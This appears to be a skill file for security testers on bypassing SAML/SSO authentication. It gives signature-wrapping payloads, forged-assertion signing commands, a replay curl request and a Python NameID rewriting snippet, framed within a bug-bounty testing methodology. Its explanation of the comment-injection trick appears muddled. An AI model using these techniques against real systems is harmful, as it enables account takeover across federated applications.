---
name: saml_sso_bypass
description: SAML and SSO authentication bypass via parser differentials, signature wrapping, and assertion manipulation
---

# SAML/SSO Authentication Bypass

SAML (Security Assertion Markup Language) is the backbone of enterprise SSO. Its complexity — XML parsing, canonicalization, signature validation, and multi-party trust — creates a wide attack surface. Recent critical vulnerabilities in ruby-saml (CVE-2025-25291/25292) and samlify (CVE-2025-47949) demonstrate that even well-maintained libraries fail to handle XML's edge cases correctly. A single SAML bypass typically yields account takeover on every application behind the IdP.

## Attack Surface

**SAML Endpoints**
- SP (Service Provider) ACS (Assertion Consumer Service): receives and validates SAML responses
- SP metadata endpoint: `/saml/metadata`, `/auth/saml/metadata` — reveals entity ID, ACS URL, signing certificate
- IdP SSO endpoint: initiates authentication flow
- SP SLO (Single Logout) endpoint: sometimes less validated than ACS

**Identifying SAML in Scope**
```bash
# Common SAML endpoint paths
/saml/acs
/saml/consume
/auth/saml/callback
/sso/saml
/api/auth/saml
/saml2/acs
/simplesaml/module.php/saml/sp/saml2-acs.php

# Check for SAML metadata
curl -s https://target.com/saml/metadata | head -50
curl -s https://target.com/.well-known/saml-metadata
```

**SAML Libraries to Target**
- ruby-saml (Ruby/Rails) — CVE-2025-25291/25292
- samlify (Node.js) — CVE-2025-47949
- python3-saml / OneLogin SAML toolkit
- Spring Security SAML
- SimpleSAMLphp
- Shibboleth SP

## Key Vulnerabilities

### XML Signature Wrapping (XSW)

SAML assertions are signed XML documents. Signature wrapping moves the signed assertion to a location the signature validator checks, while placing a malicious assertion where the application logic reads it.

**XSW Attack Variants:**

**XSW1 — Clone and wrap:**
```xml
<samlp:Response>
  <saml:Assertion ID="evil">
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <ds:Signature>
    <!-- Signature still references original assertion by ID -->
  </ds:Signature>
  <saml:Assertion ID="original">
    <!-- Original signed assertion moved here -->
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

The signature validator finds and validates the original assertion (by ID reference). The application logic reads the first assertion (evil one) with admin@target.com.

**XSW2 — Wrap in Extensions:**
```xml
<samlp:Response>
  <saml:Assertion ID="evil">
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <samlp:Extensions>
    <saml:Assertion ID="original">
      <!-- Original signed assertion buried in Extensions -->
    </saml:Assertion>
  </samlp:Extensions>
</samlp:Response>
```

### XML Parser Differentials (CVE-2025-25291/25292, ruby-saml)

ruby-saml used REXML for signature verification but Nokogiri for data extraction. These parsers handle edge cases differently:

**Comment injection in NameID:**
```xml
<saml:NameID>admin@target.com<!---->.evil.com</saml:NameID>
```
- REXML (signature check): sees `admin@target.com.evil.com` (ignores comment)
- Nokogiri (data extraction): sees `admin@target.com` (truncates at comment)

**Entity handling differences:**
```xml
<saml:NameID>admin@target.com&#x00;</saml:NameID>
```
Different parsers handle null bytes, unicode normalization, and entity expansion differently, allowing the signed value to differ from the extracted value.

### Signature Exclusion / Missing Validation (CVE-2025-47949, samlify)

Some libraries do not enforce that the assertion MUST be signed:
```xml
<samlp:Response>
  <!-- Response may be signed but assertion is not -->
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
    <!-- No ds:Signature element — and the library accepts it -->
  </saml:Assertion>
</samlp:Response>
```

**Testing:** Remove the `<ds:Signature>` block entirely from the assertion and submit. If the SP accepts it, signature validation is broken.

### Assertion Replay

Capture a valid SAML response and replay it:
```bash
# Intercept SAML response (base64-encoded in POST body)
# In Burp, capture the POST to the ACS endpoint
# Decode: echo "$SAML_RESPONSE" | base64 -d | xmllint --format -

# Replay after session expires
curl -X POST https://target.com/saml/acs \
  -d "SAMLResponse=$ENCODED_RESPONSE&RelayState=$RELAY_STATE"
```
If the SP does not track consumed assertion IDs (InResponseTo, NotOnOrAfter), replays succeed.

### Audience Restriction Bypass

```xml
<saml:AudienceRestriction>
  <saml:Audience>https://sp1.target.com</saml:Audience>
</saml:AudienceRestriction>
```
Test if the SP validates the audience matches its own entity ID. Modify the audience to a different SP or remove it entirely.

### Certificate Confusion

Some SPs accept any certificate that signs the assertion, not just the IdP's known certificate:
```bash
# Generate a self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj '/CN=evil'

# Sign the forged assertion with your certificate
# Use xmlsec1 or a SAML library to sign
xmlsec1 --sign --privkey-pem key.pem --id-attr:ID Assertion forged_assertion.xml
```

## Bypass Techniques

**XML Canonicalization Tricks**
- Namespace redeclaration: add xmlns attributes that change how elements are canonicalized
- Whitespace manipulation in tags and attributes
- Default namespace injection to shift element resolution

**Encoding Tricks**
- Base64 padding variations (some decoders accept invalid padding)
- URL encoding in SAMLResponse parameter
- Deflate + Base64 for SAMLRequest (redirect binding)
- Double encoding of special characters

**Response vs Assertion Signatures**
- If only the Response is signed (not the Assertion), modify the Assertion freely
- If only the Assertion is signed, wrap/clone the entire Response structure
- Test removing each signature independently

## Tools

**SAML Raider (Burp Extension)**
```
Install from BApp Store
Intercept SAML response > right-click > SAML Raider
- Decode and edit assertions
- Test XSW variants (8 built-in attack profiles)
- Sign with custom certificate
- Clone and manipulate assertions
```

**saml-decoder (command line)**
```bash
# Decode SAML response
echo "$SAML_RESPONSE" | base64 -d | xmllint --format -

# For deflated (redirect binding)
echo "$SAML_REQUEST" | base64 -d | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(),-15))" | xmllint --format -
```

**xmlsec1 (signature operations)**
```bash
# Verify a SAML assertion's signature
xmlsec1 --verify --pubkey-cert-pem idp_cert.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion response.xml

# Sign a forged assertion
xmlsec1 --sign --privkey-pem attacker_key.pem --id-attr:ID Assertion forged.xml
```

**SAMLTool (custom Python)**
```python
# Quick SAML response manipulation
import base64, zlib
from lxml import etree

saml_b64 = "PHNhbWxwOl..."  # from intercepted POST
xml = base64.b64decode(saml_b64)
tree = etree.fromstring(xml)

# Find NameID and modify
ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
nameid = tree.find('.//saml:NameID', ns)
print(f"Original: {nameid.text}")
nameid.text = "admin@target.com"

# Re-encode
modified = base64.b64encode(etree.tostring(tree)).decode()
```

## Testing Methodology

1. **Identify SAML endpoints** — Discover ACS, metadata, and SLO URLs from the application
2. **Extract metadata** — Download SP metadata to understand entity ID, supported bindings, and expected certificate
3. **Capture valid flow** — Complete a legitimate SAML login and capture the SAMLResponse in Burp
4. **Decode and analyze** — Base64-decode the response, examine assertion structure, signatures, conditions
5. **Test signature removal** — Remove the Signature element entirely; if accepted, critical vulnerability
6. **Test XSW variants** — Use SAML Raider's built-in XSW attacks (8 variants)
7. **Test parser differentials** — Inject comments, null bytes, and entities into NameID to test for dual-parser issues
8. **Test assertion replay** — Replay a captured response after session invalidation
9. **Test audience restriction** — Modify or remove the Audience element
10. **Test certificate confusion** — Sign with a self-generated certificate

## Validation Requirements

1. **Prove authentication bypass** — Demonstrate logging in as a different user (ideally a test account you control, not a real admin)
2. **Show the manipulated assertion** — Include the before/after XML showing exactly what was modified
3. **Document the library/version** — Identify the SAML library and version in use (check dependencies, error messages, response headers)
4. **Demonstrate reproducibility** — The bypass must work consistently, not as a race condition or timing-dependent attack
5. **Assess blast radius** — A SAML bypass typically affects ALL applications behind the IdP; document the scope

## False Positives

- SAML responses rejected after modification (proper signature validation)
- XSW attempts that fail because the SP uses strict XPath to locate the assertion
- Replay attempts blocked by InResponseTo tracking or NotOnOrAfter enforcement
- SP correctly validates audience restriction and rejects cross-SP assertions

## Impact

- **Account takeover** — Authenticate as any user in the organization without credentials
- **Privilege escalation** — Access admin accounts by forging assertions with admin NameID
- **Multi-application compromise** — A single IdP bypass affects every SP in the federation
- **Lateral movement** — Use forged SAML assertions to access internal applications behind SSO
- GitHub paid $35K for a ruby-saml bypass that allowed account takeover via SAML SSO

## Pro Tips

1. Always check which SAML library is in use — recent CVEs in ruby-saml and samlify mean many targets are still unpatched
2. The parser differential attack (comment injection in NameID) is devastatingly simple and widely exploitable
3. Test both Response-level and Assertion-level signatures independently — many apps only validate one
4. SAML metadata is often publicly accessible and reveals the exact configuration needed to forge assertions
5. SLO (logout) endpoints are frequently less validated than ACS endpoints — test them separately
6. If you find a SAML bypass, the impact is almost always Critical — it grants access to every user on every SP
7. SP-initiated vs IdP-initiated flows may have different validation paths; test both
8. Keep an eye on SAML library CVEs — they are high-value targets and new bugs emerge regularly

## Summary

SAML's XML complexity creates a rich attack surface. Parser differentials, signature wrapping, and missing validation checks have produced critical vulnerabilities in every major SAML library. Test signature removal first (quick win), then XSW variants and parser tricks. A single bypass typically grants organization-wide account takeover across all federated applications.
